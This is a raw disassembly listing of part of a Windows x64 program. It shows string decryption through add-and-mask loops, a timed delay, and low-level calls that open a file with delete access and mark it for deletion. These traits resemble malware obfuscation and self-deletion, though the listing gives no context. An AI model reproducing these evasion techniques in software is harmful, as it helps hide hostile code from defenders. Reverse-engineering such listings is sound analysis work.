   140004381:	66 0f db d9          	pand   %xmm1,%xmm3
   140004385:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140004389:	f3 0f 7f 15 9f c1 2b 	movdqu %xmm2,0x2bc19f(%rip)        # 0x1402c0530
   140004390:	00 
   140004391:	f3 0f 7e 15 a7 c1 2b 	movq   0x2bc1a7(%rip),%xmm2        # 0x1402c0540
   140004398:	00 
   140004399:	66 0f fd d0          	paddw  %xmm0,%xmm2
   14000439d:	66 0f db d1          	pand   %xmm1,%xmm2
   1400043a1:	f3 0f 7e 1d 9f c1 2b 	movq   0x2bc19f(%rip),%xmm3        # 0x1402c0548
   1400043a8:	00 
   1400043a9:	66 0f fd d8          	paddw  %xmm0,%xmm3
   1400043ad:	66 0f db d9          	pand   %xmm1,%xmm3
   1400043b1:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   1400043b5:	f3 0f 7f 15 83 c1 2b 	movdqu %xmm2,0x2bc183(%rip)        # 0x1402c0540
   1400043bc:	00 
   1400043bd:	f3 0f 7e 15 8b c1 2b 	movq   0x2bc18b(%rip),%xmm2        # 0x1402c0550
   1400043c4:	00 
   1400043c5:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400043c9:	66 0f db d1          	pand   %xmm1,%xmm2
   1400043cd:	f3 0f 7e 1d 83 c1 2b 	movq   0x2bc183(%rip),%xmm3        # 0x1402c0558
   1400043d4:	00 
   1400043d5:	66 0f fd d8          	paddw  %xmm0,%xmm3
   1400043d9:	66 0f db d9          	pand   %xmm1,%xmm3
   1400043dd:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   1400043e1:	f3 0f 7f 15 67 c1 2b 	movdqu %xmm2,0x2bc167(%rip)        # 0x1402c0550
   1400043e8:	00 
   1400043e9:	f3 0f 7e 15 6f c1 2b 	movq   0x2bc16f(%rip),%xmm2        # 0x1402c0560
   1400043f0:	00 
   1400043f1:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400043f5:	66 0f db d1          	pand   %xmm1,%xmm2
   1400043f9:	66 0f d6 15 5f c1 2b 	movq   %xmm2,0x2bc15f(%rip)        # 0x1402c0560
   140004400:	00 
   140004401:	b8 c9 00 00 00       	mov    $0xc9,%eax
   140004406:	8b 0d 5c c1 2b 00    	mov    0x2bc15c(%rip),%ecx        # 0x1402c0568
   14000440c:	01 c1                	add    %eax,%ecx
   14000440e:	0f b6 c9             	movzbl %cl,%ecx
   140004411:	66 89 0d 50 c1 2b 00 	mov    %cx,0x2bc150(%rip)        # 0x1402c0568
   140004418:	0f b7 0d 4b c1 2b 00 	movzwl 0x2bc14b(%rip),%ecx        # 0x1402c056a
   14000441f:	81 c1 c9 00 00 00    	add    $0xc9,%ecx
   140004425:	0f b6 c9             	movzbl %cl,%ecx
   140004428:	66 89 0d 3b c1 2b 00 	mov    %cx,0x2bc13b(%rip)        # 0x1402c056a
   14000442f:	03 05 37 c1 2b 00    	add    0x2bc137(%rip),%eax        # 0x1402c056c
   140004435:	0f b6 c0             	movzbl %al,%eax
   140004438:	66 89 05 2d c1 2b 00 	mov    %ax,0x2bc12d(%rip)        # 0x1402c056c
   14000443f:	c6 05 28 c1 2b 00 00 	movb   $0x0,0x2bc128(%rip)        # 0x1402c056e
   140004446:	48 8d 9d 20 0a 00 00 	lea    0xa20(%rbp),%rbx
   14000444d:	48 89 d9             	mov    %rbx,%rcx
   140004450:	48 89 fa             	mov    %rdi,%rdx
   140004453:	e8 98 61 00 00       	call   0x14000a5f0
   140004458:	48 8d 15 d1 c0 2b 00 	lea    0x2bc0d1(%rip),%rdx        # 0x1402c0530
   14000445f:	48 89 d9             	mov    %rbx,%rcx
   140004462:	e8 79 61 00 00       	call   0x14000a5e0
   140004467:	48 8d 8d 30 0c 00 00 	lea    0xc30(%rbp),%rcx
   14000446e:	48 89 da             	mov    %rbx,%rdx
   140004471:	e8 0a 62 00 00       	call   0x14000a680
   140004476:	85 c0                	test   %eax,%eax
   140004478:	74 19                	je     0x140004493
   14000447a:	48 c7 85 60 12 00 00 	movq   $0xfffffffff70f2e80,0x1260(%rbp)
   140004481:	80 2e 0f f7 
   140004485:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   14000448c:	31 c9                	xor    %ecx,%ecx
   14000448e:	e8 43 d0 ff ff       	call   0x1400014d6
   140004493:	48 8d 8d e0 01 00 00 	lea    0x1e0(%rbp),%rcx
   14000449a:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400044a0:	31 d2                	xor    %edx,%edx
   1400044a2:	e8 39 62 00 00       	call   0x14000a6e0
   1400044a7:	80 3d da bd 2b 00 00 	cmpb   $0x0,0x2bbdda(%rip)        # 0x1402c0288
   1400044ae:	0f 84 c6 30 00 00    	je     0x14000757a
   1400044b4:	80 3d c7 c0 2b 00 00 	cmpb   $0x0,0x2bc0c7(%rip)        # 0x1402c0582
   1400044bb:	74 3c                	je     0x1400044f9
   1400044bd:	66 0f 6f 05 ab c0 2b 	movdqa 0x2bc0ab(%rip),%xmm0        # 0x1402c0570
   1400044c4:	00 
   1400044c5:	66 0f fd 05 33 72 00 	paddw  0x7233(%rip),%xmm0        # 0x14000b700
   1400044cc:	00 
   1400044cd:	66 0f db 05 4b 71 00 	pand   0x714b(%rip),%xmm0        # 0x14000b620
   1400044d4:	00 
   1400044d5:	66 0f 7f 05 93 c0 2b 	movdqa %xmm0,0x2bc093(%rip)        # 0x1402c0570
   1400044dc:	00 
   1400044dd:	b8 85 00 00 00       	mov    $0x85,%eax
   1400044e2:	03 05 98 c0 2b 00    	add    0x2bc098(%rip),%eax        # 0x1402c0580
   1400044e8:	0f b6 c0             	movzbl %al,%eax
   1400044eb:	66 89 05 8e c0 2b 00 	mov    %ax,0x2bc08e(%rip)        # 0x1402c0580
   1400044f2:	c6 05 89 c0 2b 00 00 	movb   $0x0,0x2bc089(%rip)        # 0x1402c0582
   1400044f9:	4c 8d bd e0 01 00 00 	lea    0x1e0(%rbp),%r15
   140004500:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140004507:	4c 89 f9             	mov    %r15,%rcx
   14000450a:	e8 e1 60 00 00       	call   0x14000a5f0
   14000450f:	48 8d 15 5a c0 2b 00 	lea    0x2bc05a(%rip),%rdx        # 0x1402c0570
   140004516:	4c 89 f9             	mov    %r15,%rcx
   140004519:	e8 c2 60 00 00       	call   0x14000a5e0
   14000451e:	48 8d 8d 10 08 00 00 	lea    0x810(%rbp),%rcx
   140004525:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   14000452b:	31 d2                	xor    %edx,%edx
   14000452d:	e8 ae 61 00 00       	call   0x14000a6e0
   140004532:	80 3d 50 bd 2b 00 00 	cmpb   $0x0,0x2bbd50(%rip)        # 0x1402c0289
   140004539:	0f 84 80 30 00 00    	je     0x1400075bf
   14000453f:	80 3d 62 c0 2b 00 00 	cmpb   $0x0,0x2bc062(%rip)        # 0x1402c05a8
   140004546:	74 47                	je     0x14000458f
   140004548:	66 0f 6f 05 40 c0 2b 	movdqa 0x2bc040(%rip),%xmm0        # 0x1402c0590
   14000454f:	00 
   140004550:	66 0f fd 05 c8 71 00 	paddw  0x71c8(%rip),%xmm0        # 0x14000b720
   140004557:	00 
   140004558:	66 0f db 05 c0 70 00 	pand   0x70c0(%rip),%xmm0        # 0x14000b620
   14000455f:	00 
   140004560:	66 0f 7f 05 28 c0 2b 	movdqa %xmm0,0x2bc028(%rip)        # 0x1402c0590
   140004567:	00 
   140004568:	f3 0f 7e 05 30 c0 2b 	movq   0x2bc030(%rip),%xmm0        # 0x1402c05a0
   14000456f:	00 
   140004570:	66 0f fd 05 b8 71 00 	paddw  0x71b8(%rip),%xmm0        # 0x14000b730
   140004577:	00 
   140004578:	66 0f db 05 e0 70 00 	pand   0x70e0(%rip),%xmm0        # 0x14000b660
   14000457f:	00 
   140004580:	66 0f d6 05 18 c0 2b 	movq   %xmm0,0x2bc018(%rip)        # 0x1402c05a0
   140004587:	00 
   140004588:	c6 05 19 c0 2b 00 00 	movb   $0x0,0x2bc019(%rip)        # 0x1402c05a8
   14000458f:	48 8d bd 10 08 00 00 	lea    0x810(%rbp),%rdi
   140004596:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   14000459d:	48 89 f9             	mov    %rdi,%rcx
   1400045a0:	e8 4b 60 00 00       	call   0x14000a5f0
   1400045a5:	48 8d 15 e4 bf 2b 00 	lea    0x2bbfe4(%rip),%rdx        # 0x1402c0590
   1400045ac:	48 89 f9             	mov    %rdi,%rcx
   1400045af:	e8 2c 60 00 00       	call   0x14000a5e0
   1400045b4:	48 8d 8d f0 03 00 00 	lea    0x3f0(%rbp),%rcx
   1400045bb:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400045c1:	31 d2                	xor    %edx,%edx
   1400045c3:	e8 18 61 00 00       	call   0x14000a6e0
   1400045c8:	80 3d bb bc 2b 00 00 	cmpb   $0x0,0x2bbcbb(%rip)        # 0x1402c028a
   1400045cf:	0f 84 37 30 00 00    	je     0x14000760c
   1400045d5:	80 3d e4 bf 2b 00 00 	cmpb   $0x0,0x2bbfe4(%rip)        # 0x1402c05c0
   1400045dc:	74 27                	je     0x140004605
   1400045de:	66 0f 6f 05 ca bf 2b 	movdqa 0x2bbfca(%rip),%xmm0        # 0x1402c05b0
   1400045e5:	00 
   1400045e6:	66 0f fd 05 62 71 00 	paddw  0x7162(%rip),%xmm0        # 0x14000b750
   1400045ed:	00 
   1400045ee:	66 0f db 05 2a 70 00 	pand   0x702a(%rip),%xmm0        # 0x14000b620
   1400045f5:	00 
   1400045f6:	66 0f 7f 05 b2 bf 2b 	movdqa %xmm0,0x2bbfb2(%rip)        # 0x1402c05b0
   1400045fd:	00 
   1400045fe:	c6 05 bb bf 2b 00 00 	movb   $0x0,0x2bbfbb(%rip)        # 0x1402c05c0
   140004605:	48 8d bd f0 03 00 00 	lea    0x3f0(%rbp),%rdi
   14000460c:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   140004613:	48 89 f9             	mov    %rdi,%rcx
   140004616:	e8 d5 5f 00 00       	call   0x14000a5f0
   14000461b:	48 8d 15 8e bf 2b 00 	lea    0x2bbf8e(%rip),%rdx        # 0x1402c05b0
   140004622:	48 89 f9             	mov    %rdi,%rcx
   140004625:	e8 b6 5f 00 00       	call   0x14000a5e0
   14000462a:	80 3d 5a bc 2b 00 00 	cmpb   $0x0,0x2bbc5a(%rip)        # 0x1402c028b
   140004631:	0f 84 11 30 00 00    	je     0x140007648
   140004637:	80 3d 68 c0 2b 00 00 	cmpb   $0x0,0x2bc068(%rip)        # 0x1402c06a6
   14000463e:	0f 84 85 01 00 00    	je     0x1400047c9
   140004644:	66 0f 6f 05 14 71 00 	movdqa 0x7114(%rip),%xmm0        # 0x14000b760
   14000464b:	00 
   14000464c:	66 0f 6f 15 7c bf 2b 	movdqa 0x2bbf7c(%rip),%xmm2        # 0x1402c05d0
   140004653:	00 
   140004654:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004658:	66 0f 6f 0d c0 6f 00 	movdqa 0x6fc0(%rip),%xmm1        # 0x14000b620
   14000465f:	00 
   140004660:	66 0f db d1          	pand   %xmm1,%xmm2
   140004664:	66 0f 7f 15 64 bf 2b 	movdqa %xmm2,0x2bbf64(%rip)        # 0x1402c05d0
   14000466b:	00 
   14000466c:	66 0f 6f 15 6c bf 2b 	movdqa 0x2bbf6c(%rip),%xmm2        # 0x1402c05e0
   140004673:	00 
   140004674:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004678:	66 0f db d1          	pand   %xmm1,%xmm2
   14000467c:	66 0f 7f 15 5c bf 2b 	movdqa %xmm2,0x2bbf5c(%rip)        # 0x1402c05e0
   140004683:	00 
   140004684:	66 0f 6f 15 64 bf 2b 	movdqa 0x2bbf64(%rip),%xmm2        # 0x1402c05f0
   14000468b:	00 
   14000468c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004690:	66 0f db d1          	pand   %xmm1,%xmm2
   140004694:	66 0f 7f 15 54 bf 2b 	movdqa %xmm2,0x2bbf54(%rip)        # 0x1402c05f0
   14000469b:	00 
   14000469c:	66 0f 6f 15 5c bf 2b 	movdqa 0x2bbf5c(%rip),%xmm2        # 0x1402c0600
   1400046a3:	00 
   1400046a4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400046a8:	66 0f db d1          	pand   %xmm1,%xmm2
   1400046ac:	66 0f 7f 15 4c bf 2b 	movdqa %xmm2,0x2bbf4c(%rip)        # 0x1402c0600
   1400046b3:	00 
   1400046b4:	66 0f 6f 15 54 bf 2b 	movdqa 0x2bbf54(%rip),%xmm2        # 0x1402c0610
   1400046bb:	00 
   1400046bc:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400046c0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400046c4:	66 0f 7f 15 44 bf 2b 	movdqa %xmm2,0x2bbf44(%rip)        # 0x1402c0610
   1400046cb:	00 
   1400046cc:	66 0f 6f 15 4c bf 2b 	movdqa 0x2bbf4c(%rip),%xmm2        # 0x1402c0620
   1400046d3:	00 
   1400046d4:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400046d8:	66 0f db d1          	pand   %xmm1,%xmm2
   1400046dc:	66 0f 7f 15 3c bf 2b 	movdqa %xmm2,0x2bbf3c(%rip)        # 0x1402c0620
   1400046e3:	00 
   1400046e4:	66 0f 6f 15 44 bf 2b 	movdqa 0x2bbf44(%rip),%xmm2        # 0x1402c0630
   1400046eb:	00 
   1400046ec:	66 0f fd d0          	paddw  %xmm0,%xmm2
   1400046f0:	66 0f db d1          	pand   %xmm1,%xmm2
   1400046f4:	66 0f 7f 15 34 bf 2b 	movdqa %xmm2,0x2bbf34(%rip)        # 0x1402c0630
   1400046fb:	00 
   1400046fc:	66 0f 6f 15 3c bf 2b 	movdqa 0x2bbf3c(%rip),%xmm2        # 0x1402c0640
   140004703:	00 
   140004704:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004708:	66 0f db d1          	pand   %xmm1,%xmm2
   14000470c:	66 0f 7f 15 2c bf 2b 	movdqa %xmm2,0x2bbf2c(%rip)        # 0x1402c0640
   140004713:	00 
   140004714:	66 0f 6f 15 34 bf 2b 	movdqa 0x2bbf34(%rip),%xmm2        # 0x1402c0650
   14000471b:	00 
   14000471c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004720:	66 0f db d1          	pand   %xmm1,%xmm2
   140004724:	66 0f 7f 15 24 bf 2b 	movdqa %xmm2,0x2bbf24(%rip)        # 0x1402c0650
   14000472b:	00 
   14000472c:	66 0f 6f 15 2c bf 2b 	movdqa 0x2bbf2c(%rip),%xmm2        # 0x1402c0660
   140004733:	00 
   140004734:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004738:	66 0f db d1          	pand   %xmm1,%xmm2
   14000473c:	66 0f 7f 15 1c bf 2b 	movdqa %xmm2,0x2bbf1c(%rip)        # 0x1402c0660
   140004743:	00 
   140004744:	66 0f 6f 15 24 bf 2b 	movdqa 0x2bbf24(%rip),%xmm2        # 0x1402c0670
   14000474b:	00 
   14000474c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004750:	66 0f db d1          	pand   %xmm1,%xmm2
   140004754:	66 0f 7f 15 14 bf 2b 	movdqa %xmm2,0x2bbf14(%rip)        # 0x1402c0670
   14000475b:	00 
   14000475c:	66 0f 6f 15 1c bf 2b 	movdqa 0x2bbf1c(%rip),%xmm2        # 0x1402c0680
   140004763:	00 
   140004764:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140004768:	66 0f db d1          	pand   %xmm1,%xmm2
   14000476c:	66 0f 7f 15 0c bf 2b 	movdqa %xmm2,0x2bbf0c(%rip)        # 0x1402c0680
   140004773:	00 
   140004774:	66 0f fd 05 14 bf 2b 	paddw  0x2bbf14(%rip),%xmm0        # 0x1402c0690
   14000477b:	00 
   14000477c:	66 0f db c1          	pand   %xmm1,%xmm0
   140004780:	66 0f 7f 05 08 bf 2b 	movdqa %xmm0,0x2bbf08(%rip)        # 0x1402c0690
   140004787:	00 
   140004788:	8b 05 12 bf 2b 00    	mov    0x2bbf12(%rip),%eax        # 0x1402c06a0
   14000478e:	83 c0 5b             	add    $0x5b,%eax
   140004791:	0f b6 c0             	movzbl %al,%eax
   140004794:	66 89 05 05 bf 2b 00 	mov    %ax,0x2bbf05(%rip)        # 0x1402c06a0
   14000479b:	0f b7 05 00 bf 2b 00 	movzwl 0x2bbf00(%rip),%eax        # 0x1402c06a2
   1400047a2:	83 c0 5b             	add    $0x5b,%eax
   1400047a5:	0f b6 c0             	movzbl %al,%eax
   1400047a8:	66 89 05 f3 be 2b 00 	mov    %ax,0x2bbef3(%rip)        # 0x1402c06a2
   1400047af:	8b 05 ef be 2b 00    	mov    0x2bbeef(%rip),%eax        # 0x1402c06a4
   1400047b5:	83 c0 5b             	add    $0x5b,%eax
   1400047b8:	0f b6 c0             	movzbl %al,%eax
   1400047bb:	66 89 05 e2 be 2b 00 	mov    %ax,0x2bbee2(%rip)        # 0x1402c06a4
   1400047c2:	c6 05 dd be 2b 00 00 	movb   $0x0,0x2bbedd(%rip)        # 0x1402c06a6
   1400047c9:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400047ce:	4c 8d 0d fb bd 2b 00 	lea    0x2bbdfb(%rip),%r9        # 0x1402c05d0
   1400047d5:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   1400047dc:	b1 01                	mov    $0x1,%cl
   1400047de:	4d 89 f0             	mov    %r14,%r8
   1400047e1:	e8 0a e6 ff ff       	call   0x140002df0
   1400047e6:	80 3d 9f ba 2b 00 00 	cmpb   $0x0,0x2bba9f(%rip)        # 0x1402c028c
   1400047ed:	0f 84 9a 2e 00 00    	je     0x14000768d
   1400047f3:	80 3d 1c bf 2b 00 00 	cmpb   $0x0,0x2bbf1c(%rip)        # 0x1402c0716
   1400047fa:	0f 84 dd 00 00 00    	je     0x1400048dd
   140004800:	66 0f 6f 05 68 6f 00 	movdqa 0x6f68(%rip),%xmm0        # 0x14000b770
   140004807:	00 
   140004808:	66 0f 6f 0d a0 be 2b 	movdqa 0x2bbea0(%rip),%xmm1        # 0x1402c06b0
   14000480f:	00 
   140004810:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004814:	66 0f 6f 15 04 6e 00 	movdqa 0x6e04(%rip),%xmm2        # 0x14000b620
   14000481b:	00 
   14000481c:	66 0f db ca          	pand   %xmm2,%xmm1
   140004820:	66 0f 7f 0d 88 be 2b 	movdqa %xmm1,0x2bbe88(%rip)        # 0x1402c06b0
   140004827:	00 
   140004828:	66 0f 6f 0d 90 be 2b 	movdqa 0x2bbe90(%rip),%xmm1        # 0x1402c06c0
   14000482f:	00 
   140004830:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004834:	66 0f db ca          	pand   %xmm2,%xmm1
   140004838:	66 0f 7f 0d 80 be 2b 	movdqa %xmm1,0x2bbe80(%rip)        # 0x1402c06c0
   14000483f:	00 
   140004840:	66 0f 6f 0d 88 be 2b 	movdqa 0x2bbe88(%rip),%xmm1        # 0x1402c06d0
   140004847:	00 
   140004848:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000484c:	66 0f db ca          	pand   %xmm2,%xmm1
   140004850:	66 0f 7f 0d 78 be 2b 	movdqa %xmm1,0x2bbe78(%rip)        # 0x1402c06d0
   140004857:	00 
   140004858:	66 0f 6f 0d 80 be 2b 	movdqa 0x2bbe80(%rip),%xmm1        # 0x1402c06e0
   14000485f:	00 
   140004860:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004864:	66 0f db ca          	pand   %xmm2,%xmm1
   140004868:	66 0f 7f 0d 70 be 2b 	movdqa %xmm1,0x2bbe70(%rip)        # 0x1402c06e0
   14000486f:	00 
   140004870:	66 0f 6f 0d 78 be 2b 	movdqa 0x2bbe78(%rip),%xmm1        # 0x1402c06f0
   140004877:	00 
   140004878:	66 0f fd c8          	paddw  %xmm0,%xmm1
   14000487c:	66 0f db ca          	pand   %xmm2,%xmm1
   140004880:	66 0f 7f 0d 68 be 2b 	movdqa %xmm1,0x2bbe68(%rip)        # 0x1402c06f0
   140004887:	00 
   140004888:	66 0f fd 05 70 be 2b 	paddw  0x2bbe70(%rip),%xmm0        # 0x1402c0700
   14000488f:	00 
   140004890:	66 0f db c2          	pand   %xmm2,%xmm0
   140004894:	66 0f 7f 05 64 be 2b 	movdqa %xmm0,0x2bbe64(%rip)        # 0x1402c0700
   14000489b:	00 
   14000489c:	8b 05 6e be 2b 00    	mov    0x2bbe6e(%rip),%eax        # 0x1402c0710
   1400048a2:	83 c0 79             	add    $0x79,%eax
   1400048a5:	0f b6 c0             	movzbl %al,%eax
   1400048a8:	66 89 05 61 be 2b 00 	mov    %ax,0x2bbe61(%rip)        # 0x1402c0710
   1400048af:	0f b7 05 5c be 2b 00 	movzwl 0x2bbe5c(%rip),%eax        # 0x1402c0712
   1400048b6:	83 c0 79             	add    $0x79,%eax
   1400048b9:	0f b6 c0             	movzbl %al,%eax
   1400048bc:	66 89 05 4f be 2b 00 	mov    %ax,0x2bbe4f(%rip)        # 0x1402c0712
   1400048c3:	8b 05 4b be 2b 00    	mov    0x2bbe4b(%rip),%eax        # 0x1402c0714
   1400048c9:	83 c0 79             	add    $0x79,%eax
   1400048cc:	0f b6 c0             	movzbl %al,%eax
   1400048cf:	66 89 05 3e be 2b 00 	mov    %ax,0x2bbe3e(%rip)        # 0x1402c0714
   1400048d6:	c6 05 39 be 2b 00 00 	movb   $0x0,0x2bbe39(%rip)        # 0x1402c0716
   1400048dd:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400048e2:	4c 8d 0d c7 bd 2b 00 	lea    0x2bbdc7(%rip),%r9        # 0x1402c06b0
   1400048e9:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   1400048f0:	31 c9                	xor    %ecx,%ecx
   1400048f2:	4d 89 f8             	mov    %r15,%r8
   1400048f5:	e8 f6 e4 ff ff       	call   0x140002df0
   1400048fa:	48 8d 8d 00 06 00 00 	lea    0x600(%rbp),%rcx
   140004901:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004907:	31 d2                	xor    %edx,%edx
   140004909:	e8 d2 5d 00 00       	call   0x14000a6e0
   14000490e:	80 3d 78 b9 2b 00 00 	cmpb   $0x0,0x2bb978(%rip)        # 0x1402c028d
   140004915:	0f 84 05 2e 00 00    	je     0x140007720
   14000491b:	80 3d 10 be 2b 00 00 	cmpb   $0x0,0x2bbe10(%rip)        # 0x1402c0732
   140004922:	74 3a                	je     0x14000495e
   140004924:	66 0f 6f 05 f4 bd 2b 	movdqa 0x2bbdf4(%rip),%xmm0        # 0x1402c0720
   14000492b:	00 
   14000492c:	66 0f fd 05 5c 6e 00 	paddw  0x6e5c(%rip),%xmm0        # 0x14000b790
   140004933:	00 
   140004934:	66 0f db 05 e4 6c 00 	pand   0x6ce4(%rip),%xmm0        # 0x14000b620
   14000493b:	00 
   14000493c:	66 0f 7f 05 dc bd 2b 	movdqa %xmm0,0x2bbddc(%rip)        # 0x1402c0720
   140004943:	00 
   140004944:	8b 05 e6 bd 2b 00    	mov    0x2bbde6(%rip),%eax        # 0x1402c0730
   14000494a:	83 c0 0b             	add    $0xb,%eax
   14000494d:	0f b6 c0             	movzbl %al,%eax
   140004950:	66 89 05 d9 bd 2b 00 	mov    %ax,0x2bbdd9(%rip)        # 0x1402c0730
   140004957:	c6 05 d4 bd 2b 00 00 	movb   $0x0,0x2bbdd4(%rip)        # 0x1402c0732
   14000495e:	4c 8d b5 00 06 00 00 	lea    0x600(%rbp),%r14
   140004965:	48 8d 95 50 10 00 00 	lea    0x1050(%rbp),%rdx
   14000496c:	4c 89 f1             	mov    %r14,%rcx
   14000496f:	e8 7c 5c 00 00       	call   0x14000a5f0
   140004974:	48 8d 15 a5 bd 2b 00 	lea    0x2bbda5(%rip),%rdx        # 0x1402c0720
   14000497b:	4c 89 f1             	mov    %r14,%rcx
   14000497e:	e8 5d 5c 00 00       	call   0x14000a5e0
   140004983:	4c 8d b5 60 12 00 00 	lea    0x1260(%rbp),%r14
   14000498a:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140004990:	4c 89 f1             	mov    %r14,%rcx
   140004993:	31 d2                	xor    %edx,%edx
   140004995:	e8 46 5d 00 00       	call   0x14000a6e0
   14000499a:	80 3d d8 b8 2b 00 00 	cmpb   $0x0,0x2bb8d8(%rip)        # 0x1402c0279
   1400049a1:	0f 84 be 2d 00 00    	je     0x140007765
   1400049a7:	80 3d 24 b9 2b 00 00 	cmpb   $0x0,0x2bb924(%rip)        # 0x1402c02d2
   1400049ae:	74 3a                	je     0x1400049ea
   1400049b0:	f3 0f 7e 05 10 b9 2b 	movq   0x2bb910(%rip),%xmm0        # 0x1402c02c8
   1400049b7:	00 
   1400049b8:	66 0f fd 05 e0 6d 00 	paddw  0x6de0(%rip),%xmm0        # 0x14000b7a0
   1400049bf:	00 
   1400049c0:	66 0f db 05 98 6c 00 	pand   0x6c98(%rip),%xmm0        # 0x14000b660
   1400049c7:	00 
   1400049c8:	66 0f d6 05 f8 b8 2b 	movq   %xmm0,0x2bb8f8(%rip)        # 0x1402c02c8
   1400049cf:	00 
   1400049d0:	8b 05 fa b8 2b 00    	mov    0x2bb8fa(%rip),%eax        # 0x1402c02d0
   1400049d6:	83 c0 45             	add    $0x45,%eax
   1400049d9:	0f b6 c0             	movzbl %al,%eax
   1400049dc:	66 89 05 ed b8 2b 00 	mov    %ax,0x2bb8ed(%rip)        # 0x1402c02d0
   1400049e3:	c6 05 e8 b8 2b 00 00 	movb   $0x0,0x2bb8e8(%rip)        # 0x1402c02d2
   1400049ea:	48 8d 15 d7 b8 2b 00 	lea    0x2bb8d7(%rip),%rdx        # 0x1402c02c8
   1400049f1:	4c 89 f1             	mov    %r14,%rcx
   1400049f4:	e8 f7 5b 00 00       	call   0x14000a5f0
   1400049f9:	48 8d 95 00 06 00 00 	lea    0x600(%rbp),%rdx
   140004a00:	4c 89 f1             	mov    %r14,%rcx
   140004a03:	e8 d8 5b 00 00       	call   0x14000a5e0
   140004a08:	48 c7 85 70 14 00 00 	movq   $0x0,0x1470(%rbp)
   140004a0f:	00 00 00 00 
   140004a13:	4c 89 f1             	mov    %r14,%rcx
   140004a16:	e8 e5 5b 00 00       	call   0x14000a600
   140004a1b:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004a22:	01 c0                	add    %eax,%eax
   140004a24:	66 89 8d 72 14 00 00 	mov    %cx,0x1472(%rbp)
   140004a2b:	66 89 85 70 14 00 00 	mov    %ax,0x1470(%rbp)
   140004a32:	4c 89 b5 78 14 00 00 	mov    %r14,0x1478(%rbp)
   140004a39:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140004a3d:	66 0f 7f 85 40 0e 00 	movdqa %xmm0,0xe40(%rbp)
   140004a44:	00 
   140004a45:	66 0f 7f 85 50 0e 00 	movdqa %xmm0,0xe50(%rbp)
   140004a4c:	00 
   140004a4d:	c7 85 40 0e 00 00 30 	movl   $0x30,0xe40(%rbp)
   140004a54:	00 00 00 
   140004a57:	c7 85 58 0e 00 00 40 	movl   $0x40,0xe58(%rbp)
   140004a5e:	00 00 00 
   140004a61:	48 8d 85 70 14 00 00 	lea    0x1470(%rbp),%rax
   140004a68:	48 89 85 50 0e 00 00 	mov    %rax,0xe50(%rbp)
   140004a6f:	66 0f 7f 85 60 0e 00 	movdqa %xmm0,0xe60(%rbp)
   140004a76:	00 
   140004a77:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   140004a7e:	00 00 00 00 
   140004a82:	66 0f 7f 85 f0 16 00 	movdqa %xmm0,0x16f0(%rbp)
   140004a89:	00 
   140004a8a:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140004a91:	00 
   140004a92:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140004a99:	00 
   140004a9a:	48 8d 8d 40 17 00 00 	lea    0x1740(%rbp),%rcx
   140004aa1:	4c 8d bd 40 0e 00 00 	lea    0xe40(%rbp),%r15
   140004aa8:	4c 8d 8d f0 16 00 00 	lea    0x16f0(%rbp),%r9
   140004aaf:	ba 00 00 11 40       	mov    $0x40110000,%edx
   140004ab4:	4d 89 f8             	mov    %r15,%r8
   140004ab7:	e8 b1 c9 ff ff       	call   0x14000146d
   140004abc:	85 c0                	test   %eax,%eax
   140004abe:	78 3b                	js     0x140004afb
   140004ac0:	c6 85 30 17 00 00 01 	movb   $0x1,0x1730(%rbp)
   140004ac7:	48 8b 8d 40 17 00 00 	mov    0x1740(%rbp),%rcx
   140004ace:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%rsp)
   140004ad5:	00 
   140004ad6:	48 8d 95 f0 16 00 00 	lea    0x16f0(%rbp),%rdx
   140004add:	4c 8d 85 30 17 00 00 	lea    0x1730(%rbp),%r8
   140004ae4:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004aea:	e8 15 c9 ff ff       	call   0x140001404
   140004aef:	48 8b 8d 40 17 00 00 	mov    0x1740(%rbp),%rcx
   140004af6:	e8 63 c9 ff ff       	call   0x14000145e
   140004afb:	48 c7 85 e8 16 00 00 	movq   $0x0,0x16e8(%rbp)
   140004b02:	00 00 00 00 
   140004b06:	80 3d 81 b7 2b 00 00 	cmpb   $0x0,0x2bb781(%rip)        # 0x1402c028e
   140004b0d:	0f 84 98 2c 00 00    	je     0x1400077ab
   140004b13:	4c 8d b5 b0 16 00 00 	lea    0x16b0(%rbp),%r14
